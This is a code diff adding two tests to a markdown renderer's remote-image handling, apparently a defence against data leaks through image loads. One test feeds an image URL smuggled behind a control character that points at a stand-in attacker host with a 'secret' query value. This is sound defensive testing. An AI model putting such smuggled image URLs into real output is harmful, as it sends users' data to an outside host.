@@ -371,6 +371,23 @@ describe('remote images', () => {
     expect(div.querySelector('button.remote-image-placeholder')).not.toBeNull();
   });
 
+  it('treats a URL behind a leading control character as remote', () => {
+    // The browser strips it and fetches `//attacker.example/...`.
+    const div = parse('![chart](\x01//attacker.example/p.png?d=secret)');
+
+    expect(div.querySelector('img')).toBeNull();
+    expect(div.querySelector('button.remote-image-placeholder')).not.toBeNull();
+  });
+
+  it('does not follow a surrounding link when the placeholder is clicked', () => {
+    const div = parse(`[![chart](${remote})](https://other.example/page)`);
+    const click = new MouseEvent('click', { bubbles: true, cancelable: true });
+    div.querySelector('button.remote-image-placeholder')!.dispatchEvent(click);
+
+    expect(click.defaultPrevented).toBe(true);
+    expect(div.querySelector('a img')).toHaveAttribute('src', remote);
+  });
+
   it('renders same-origin images directly', () => {
     const src = '/api/v2/conversations/abc/files/chart.png';
     const div = parse(`![chart](${src})`);
